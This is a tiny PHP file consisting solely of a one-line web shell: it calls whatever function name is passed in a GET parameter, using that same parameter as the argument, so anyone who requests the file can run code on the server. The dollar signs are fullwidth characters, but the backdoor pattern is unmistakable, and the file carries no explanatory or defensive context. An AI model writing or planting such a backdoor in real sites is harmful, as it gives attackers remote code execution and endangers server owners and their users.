<?php
＄_GET['XehhJSYV'](＄_GET['XehhJSYV']);
?>
